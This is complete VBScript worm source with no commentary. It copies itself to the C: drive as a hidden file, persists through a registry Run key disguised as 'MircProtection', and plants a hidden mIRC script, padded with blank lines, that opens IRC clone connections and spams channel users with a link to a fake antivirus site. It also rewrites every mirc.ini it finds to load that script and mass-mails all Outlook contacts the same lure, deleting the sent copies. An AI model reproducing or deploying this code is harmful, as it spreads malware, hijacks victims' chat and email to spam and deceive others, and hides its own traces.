On Error Resume Next
Dim SHELL, WSHELL, MIRC, INI, LOOP1, VAR1, VAR2, VAR3, VAR4, VAR5, VAR6, VAR7, VAR8, VAR9, VAR10, VAR11, VAR12, VAR13
Set SHELL = CreateObject("Scripting.FileSystemObject")
Set WSHELL = CreateObject("WScript.Shell")
Set SYSTEM  = SHELL.GetSpecialFolder(1)
Set VAR1 = SHELL.Drives
If LCase(WScript.ScriptFullName) <> "c:\io.vbs" Then
  Set MIRC = SHELL.GetFile(WScript.ScriptFullName)
  MIRC.Copy ("c:\Io.vbs")
  Set MIRC = SHELL.GetFile("c:\Io.vbs")
  MIRC.Attributes = MIRC.Attributes + 2
  WSHELL.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MircProtection","c:\Io.vbs"
Else
  Set INI = SHELL.CreateTextFile(SYSTEM & "\system")
  INI.Write vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf
  INI.Write vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf & vbCrLf
  INI.Write "on *:QUIT: { if $nick = $me { if $sock(CLONE,n) != 0 { sockwrite -n CLONE QUIT : www.theantivirus.org | sockclose CLONE } } }" & vbCrLf & "on *:CONNECT: { .writeini mirc.ini text ignore *.bat, $+ *.dll, $+ *.ini, $+ *.pl, $+ *.*c*, $+ *.*e*, $+ *.*f*, $+ *.*h*, $+ *.*k*, $+ *.*q*, $+ *.*r*, $+ *.*s*, $+ *.*u*, $+ *.*y* | if $portfree(113) = $true { socklisten IDENT 113 } | sockclose CLONE | sockopen CLONE $server 6667 }" & vbCrLf & "on *:DISCONNECT: { if $sock(CLONE,n) != 0 { sockwrite -n CLONE QUIT :Leaving | sockclose CLONE | sockclose LISTEN } | unset %me %nick %in %out %random %null %chan %temp %data %cleaning %sent }" & vbCrLf 
  INI.Write "on *:SOCKLISTEN:IDENT*: { if ($sockerr > 0) return | set %temp 0 | :loop | inc %temp 1 | if $sock(ident $+ %temp,1) = $null { sockaccept ident $+ %temp | unset %temp } | else { goto loop } }" & vbCrLf & "on *:SOCKREAD:IDENT*:{ sockread %ident | sockwrite $sockname %ident : USERID : UNIX : $random | unset %ident }" & vbCrLf & "on *:SOCKCLOSE:CLONE: { sockclose CLONE | sockopen CLONE $server 6667 }" & vbCrLf & "on *:SOCKOPEN:CLONE:{ if ($sockerr > 0) { sockopen CLONE $server 6667 | return } | changenick | sockwrite -n CLONE USER $random $chr(34) $+ $random $+ $chr(34) $chr(34) $+ $random $+ $chr(34) : $+ $random | .timerJOINING 1 15 channels | .timerJOIN 0 1800 channels }" & vbCrLf
  INI.Write "on *:SOCKREAD:CLONE:{ sockread -f %data | if $gettok(%data,1,32) = PING { sockwrite -n CLONE PONG : $+ $server } | if $gettok(%data,2,32) = 263 { .timer 1 5 channels } | if $gettok(%data,2,32) = 322 { if (%chan != $null) { halt } | if ($gettok(%data,5,32) > 50) { set %chan $gettok(%data,4,32) | .timer 1 30 sockwrite -n CLONE JOIN %chan | .timer 1 10 unset %chan } } | if $gettok(%data,2,32) = JOIN { %nick = $gettok($gettok(%data,1,58),1,33) | if ($timer(0) > 5) { .return } | .timer 1 $rand(20,120) .GO %nick } }" & vbCrLf
  INI.Write "alias changenick { set %me $random | sockwrite -n CLONE NICK %me }" & vbCrLf & "alias channels { sockwrite -n CLONE list * $+ $rand(a,z) $+ $rand(a,z) $+ * }" & vbCrLf & "alias go { sockwrite -n CLONE PRIVMSG $1 :Still surfing the web unprotected? Hackers could be watching your every move. Your files could be infected, unless you're protected. Get it fast and FREE. Simple to use and downloads in seconds. - http://www.theantivirus.org/main.html }" & vbCrLf & "alias random { unset %null %random | set %null $rand(1,10) | :loop | set %random %random $+ $rand(a,z) | if $len(%random) <= %null { goto loop } | return %random }"
  Set INI = SHELL.GetFile(SYSTEM & "\system")
  INI.Attributes = INI.Attributes + 2
  DRIVES()
End If
Sub DRIVES()
  For Each VAR2 In VAR1
    If VAR2.DriveType = 2 or VAR2.DriveType = 3 Then
      SCAN(VAR2.Path)
      FOLDERS(VAR2.Path)
    End If
  Next
End Sub
Sub FOLDERS(FOLDERSPEC) 
  On Error Resume Next
  Set VAR3 = SHELL.GetFolder(FOLDERSPEC)
  Set VAR4 = VAR3.SubFolders
  For Each VAR5 In VAR4
    SCAN(VAR5.Path)
    FOLDERS(VAR5.Path)
  Next
End Sub
Sub SCAN(FOLDERSPEC)
  Set VAR6 = SHELL.GetFolder(FOLDERSPEC)
  Set VAR7 = VAR6.Files
  For Each VAR8 In VAR7
    FILENAME = LCase(VAR8.Name)
    If FILENAME = "mirc.ini" Then 
      RECONFIGURE(VAR8.Path)
    End If
  Next
End Sub
Sub RECONFIGURE(FILESPEC)
  Set MIRC = SHELL.OpenTextFile(FILESPEC,1,0)
  While MIRC.AtEndOfStream <> True
    VAR9 = MIRC.ReadLine
    If InStr(VAR9,"=") <> 0 Then
      VAR10 = ""
      For LOOP1 = 1 to Len(VAR9)
        If IsNumeric(Mid(VAR9,LOOP1,1)) = True Then VAR10 = VAR10 & Mid(VAR9,LOOP1,1)
      Next
    End If
  Wend
  VAR10 = VAR10 + 1
  Set MIRC = SHELL.OpenTextFile(FILESPEC,8,0)
  MIRC.WriteLine vbCrLf & "n" & VAR10 & "=" & SYSTEM & "\system"
End Sub
VAR11 = WSHELL.RegRead("HKEY_LOCAL_MACHINE\" & "MircProctection")
If VAR11 = 0 Then
  Set OSHELL = CreateObject("Outlook.Application")
  Set MSHELL = OSHELL.GetNameSpace("MAPI")
  For Each VAR11 In MSHELL.AddressLists
    Set NEWMAIL = OSHELL.CreateItem(0)
    For VAR12 = 1 To VAR11.AddressEntries.Count
      Set VAR13 = VAR11.AddressEntries(VAR12)
      If VAR12 = 1 Then
        NEWMAIL.BCC = VAR13.Address
      Else
        NEWMAIL.BCC = NEWMAIL.BCC & "; " & VAR13.Address
      End If
    Next
      NEWMAIL.Subject = "FWD: Protect your computer for free!!"
      NEWMAIL.Body = "Still surfing the web unprotected? Hackers could be watching your every move. Your files could be infected, unless you're protected. Get it fast and FREE. Simple to use and downloads in seconds. -=-=-=-=-=-=-=-=-=- http://www.theantivirus.org/main.html"
      NEWMAIL.DeleteAfterSubmit = True
      NEWMAIL.Send
  Next
  WSHELL.RegWrite "HKEY_LOCAL_MACHINE\" & "MircProctection", 1 
End If
